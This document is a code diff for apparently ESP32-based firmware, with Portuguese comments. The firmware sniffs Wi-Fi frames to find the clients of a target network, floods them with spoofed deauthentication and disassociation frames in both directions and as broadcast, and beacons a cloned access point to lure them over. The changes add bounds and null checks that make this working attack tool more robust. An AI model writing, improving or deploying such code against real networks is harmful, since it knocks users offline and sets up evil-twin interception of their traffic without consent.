@@ -34,22 +34,27 @@ static uint8_t discoveredClients[MAX_CLIENTS][6];
 static uint8_t clientCount = 0;
 static bool promiscuousActive = false;
 
-static void getBssidFromFrame(const uint8_t *payload, uint8_t *outBssid, const uint8_t **outClient) {
+static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *outBssid, const uint8_t **outClient) {
+    memset(outBssid, 0, 6);
+    *outClient = nullptr;
+    
+    // Frame precisa ter pelo menos 24 bytes para ter os 3 enderecos
+    if (len < 24) return;
+    
     uint8_t frameType = payload[0] & 0x0C;
     uint8_t toFromDs = payload[1] & 0x03;
     const uint8_t *addr1 = &payload[4];
     const uint8_t *addr2 = &payload[10];
     const uint8_t *addr3 = &payload[16];
     
-    memset(outBssid, 0, 6);
-    *outClient = nullptr;
-    
     if (frameType == 0x00) {
+        // MANAGEMENT: addr1=DA, addr2=SA, addr3=BSSID
         memcpy(outBssid, addr3, 6);
         if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
         else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
     }
     else if (frameType == 0x08) {
+        // DATA frame
         switch (toFromDs) {
             case 0x00:
                 memcpy(outBssid, addr3, 6);
@@ -73,11 +78,12 @@ static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     const uint8_t *payload = pkt->payload;
+    uint16_t len = pkt->rx_ctrl.sig_len;
     
     uint8_t frameBssid[6];
     const uint8_t *clientMac = nullptr;
     
-    getBssidFromFrame(payload, frameBssid, &clientMac);
+    getBssidFromFrame(payload, len, frameBssid, &clientMac);
     
     if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
     if (!clientMac) return;
@@ -121,11 +127,10 @@ static void stopPromiscuous() {
 }
 
 // ============================================================
-// RAW FRAME DEAUTH - BIDIRECIONAL
+// RAW FRAME DEAUTH - BIDIRECIONAL (com protecao contra nullptr)
 // ============================================================
 static uint16_t deauthSeqNum = 0;
 
-// Deauth do AP para o cliente (AP diz: sai da minha rede)
 static void sendDeauth_AP_to_Client(const uint8_t* bssid, const uint8_t* clientMac, uint8_t reason) {
     uint8_t frame[26];
     memset(frame, 0, 26);
@@ -135,9 +140,13 @@ static void sendDeauth_AP_to_Client(const uint8_t* bssid, const uint8_t* clientM
     frame[2] = 0x00;
     frame[3] = 0x00;
 
-    memcpy(&frame[4], clientMac, 6);   // DA = cliente
-    memcpy(&frame[10], bssid, 6);      // SA = BSSID (AP)
-    memcpy(&frame[16], bssid, 6);      // BSSID
+    if (clientMac) {
+        memcpy(&frame[4], clientMac, 6);   // DA = cliente
+    } else {
+        memset(&frame[4], 0xFF, 6);        // Broadcast
+    }
+    memcpy(&frame[10], bssid, 6);          // SA = BSSID (AP)
+    memcpy(&frame[16], bssid, 6);          // BSSID
 
     frame[22] = (deauthSeqNum << 4) & 0xFF;
     frame[23] = (deauthSeqNum >> 4) & 0xFF;
@@ -153,9 +162,9 @@ static void sendDeauth_AP_to_Client(const uint8_t* bssid, const uint8_t* clientM
     }
 }
 
-// Deauth do cliente para o AP (cliente diz: estou saindo)
-// Isso forca o AP REAL a remover o cliente da tabela de associacao
 static void sendDeauth_Client_to_AP(const uint8_t* bssid, const uint8_t* clientMac, uint8_t reason) {
+    if (!clientMac) return; // Nao pode spoofar sem MAC do cliente
+    
     uint8_t frame[26];
     memset(frame, 0, 26);
 
@@ -164,9 +173,9 @@ static void sendDeauth_Client_to_AP(const uint8_t* bssid, const uint8_t* clientM
     frame[2] = 0x00;
     frame[3] = 0x00;
 
-    memcpy(&frame[4], bssid, 6);       // DA = BSSID (AP)
-    memcpy(&frame[10], clientMac, 6);  // SA = cliente (spoofado)
-    memcpy(&frame[16], bssid, 6);      // BSSID
+    memcpy(&frame[4], bssid, 6);           // DA = BSSID (AP)
+    memcpy(&frame[10], clientMac, 6);      // SA = cliente (spoofado)
+    memcpy(&frame[16], bssid, 6);          // BSSID
 
     frame[22] = (deauthSeqNum << 4) & 0xFF;
     frame[23] = (deauthSeqNum >> 4) & 0xFF;
@@ -191,7 +200,11 @@ static void sendDisassoc_AP_to_Client(const uint8_t* bssid, const uint8_t* clien
     frame[2] = 0x00;
     frame[3] = 0x00;
 
-    memcpy(&frame[4], clientMac, 6);
+    if (clientMac) {
+        memcpy(&frame[4], clientMac, 6);
+    } else {
+        memset(&frame[4], 0xFF, 6);
+    }
     memcpy(&frame[10], bssid, 6);
     memcpy(&frame[16], bssid, 6);
 
@@ -342,8 +355,6 @@ static void startBssidClone(uint8_t networkIndex) {
 
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-        
-        // === TRAVA O CANAL DAS DUAS INTERFACES NO CANAL DO ALVO ===
         esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
         
         bssidCloneActive = true;
@@ -456,41 +467,29 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH - BURST AGRESSIVO BIDIRECIONAL
+// LOOP DE DEAUTH
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
     static unsigned long lastBurst = 0;
-    if (millis() - lastBurst >= 1) { // 1ms = 1000 bursts/segundo
+    if (millis() - lastBurst >= 2) { // 2ms entre bursts
         lastBurst = millis();
 
-        // === BIDIRECIONAL + MULTIPLOS REASON CODES ===
-        // Para cada cliente descoberto, envia:
-        // 1. AP->Cliente (reason 7)
-        // 2. Cliente->AP (reason 7) 
-        // 3. AP->Cliente (reason 1)
-        // 4. Cliente->AP (reason 1)
-        // 5. Disassoc AP->Cliente (reason 8)
-        // + Broadcast para todos
-        
+        // Para cada cliente descoberto: deauth bidirecional
         for (int i = 0; i < clientCount; i++) {
-            // AP diz pro cliente sair
             sendDeauth_AP_to_Client(deauthTargetBSSID, discoveredClients[i], 0x07);
             sendDeauth_AP_to_Client(deauthTargetBSSID, discoveredClients[i], 0x01);
             sendDisassoc_AP_to_Client(deauthTargetBSSID, discoveredClients[i], 0x08);
-            
-            // Cliente (spoofado) diz pro AP que vai sair
-            // Isso forca o AP REAL a remover o cliente da tabela
             sendDeauth_Client_to_AP(deauthTargetBSSID, discoveredClients[i], 0x07);
             sendDeauth_Client_to_AP(deauthTargetBSSID, discoveredClients[i], 0x01);
         }
 
-        // BROADCAST como fallback (para clientes ainda nao descobertos)
+        // Broadcast fallback
         sendDeauth_AP_to_Client(deauthTargetBSSID, nullptr, 0x07);
         sendDeauth_AP_to_Client(deauthTargetBSSID, nullptr, 0x01);
         
-        // BEACON para atrair
+        // Beacon
         sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID);
     }
 
@@ -510,7 +509,7 @@ bool deauthLoop() {
             }
         } else {
             int clients = WiFi.softAPgetStationNum();
-            Serial.printf("[Clone] %d on clone | %d target clients found | CH%d\n", 
+            Serial.printf("[Clone] %d on clone | %d target clients | CH%d\n", 
                 clients, clientCount, cloneChannel);
         }
     }
